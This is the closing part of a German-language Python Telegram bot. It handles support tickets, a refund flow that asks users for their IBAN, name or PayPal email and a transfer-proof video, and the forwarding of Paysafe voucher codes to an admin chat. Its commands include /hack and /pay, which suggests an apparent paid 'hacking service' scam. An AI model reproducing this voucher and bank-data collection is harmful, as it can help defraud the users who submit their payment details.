                "✅ <b>Dein Support-Ticket wurde erfolgreich eingereicht!</b>\n"
                "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
                f"📧 <b>E-Mail:</b> <code>{email}</code>\n"
                f"📝 <b>Dein Grund:</b>\n<i>{text}</i>\n\n"
                "⏳ Unser Team meldet sich so schnell wie möglich bei dir.\n\n"
                "Bei dringenden Fragen erreichst du uns auch direkt: @HunterThe1",
                parse_mode=ParseMode.HTML
            )
            return

    if user_id in refund_state:
        state = refund_state[user_id]
        step = state["step"]
        try:
            if step == "bank_iban":
                state["data"]["iban"] = text
                state["step"] = "bank_name"
                await update.message.reply_text(
                    "✅ IBAN gespeichert.\n\nBitte gib jetzt den <b>Namen des Kontoinhabers</b> ein:",
                    parse_mode=ParseMode.HTML
                )
                return
            elif step == "bank_name":
                state["data"]["name"] = text
                state["step"] = "bank_video"
                await update.message.reply_text(
                    "✅ Name gespeichert.\n\n"
                    "📹 Sende jetzt bitte ein <b>Beweisvideo deiner Überweisung</b> als Video-Nachricht.\n\n"
                    "<i>Das Video wird direkt an unser Team weitergeleitet.</i>",
                    parse_mode=ParseMode.HTML
                )
                return
            elif step == "paypal_email":
                state["data"]["email"] = text
                state["step"] = "paypal_video"
                await update.message.reply_text(
                    "✅ E-Mail gespeichert.\n\n"
                    "📹 Sende jetzt bitte ein <b>Beweisvideo deiner Überweisung</b> als Video-Nachricht.\n\n"
                    "<i>Das Video wird direkt an unser Team weitergeleitet.</i>",
                    parse_mode=ParseMode.HTML
                )
                return
        except Exception as e:
            print(f"❌ Refund-Schritt Fehler: {e}")
            await update.message.reply_text("⚠️ Fehler beim Speichern. Bitte nochmal eingeben.")
            return

    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
    if paysafe_pattern.match(text):
        if user_id in user_proof_sent:
            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
            return
        label = user_label(from_user)
        msg = (
            f"🎫 Neuer Paysafe-Code von {label}:\n"
            f"<code>{text}</code>"
        )
        try:
            sent = await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=msg,
                parse_mode=ParseMode.HTML,
            )
            forwarded_msg_to_user[sent.message_id] = user_id
            user_proof_sent.add(user_id)
            await update.message.reply_text(
                "✅ Dein Paysafe-Code wurde erfolgreich übermittelt! Wir melden uns gleich bei dir. 😊"
            )
        except Exception as e:
            print(f"❌ Paysafe-Code: {e}")

# ---- MAIN ----
def main():
    print("🚀 Bot startet...")
    keep_alive()
    download_github_media()
    application = ApplicationBuilder().token(TOKEN).build()

    # Nutzer-Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hack", hack))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("bew", bewertungen))
    application.add_handler(CommandHandler("hilfe", hilfe))
    application.add_handler(CommandHandler("invite", invite))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("faq", faq))
    application.add_handler(CommandHandler("refund", refund))
    application.add_handler(CommandHandler("verlauf", verlauf))

    # Admin-Commands
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("sendcontent", send_content))
    application.add_handler(CommandHandler("send", broadcast))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("remind", remind_all))

    # Callbacks & Media
    application.add_handler(CallbackQueryHandler(age_check, pattern="^age_"))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.VIDEO | filters.Document.VIDEO, handle_video))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # Auto-Cleanup starten
    async def on_startup(app):
        asyncio.create_task(auto_cleanup(app))

    application.post_init = on_startup

    print("✅ Bot läuft!")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
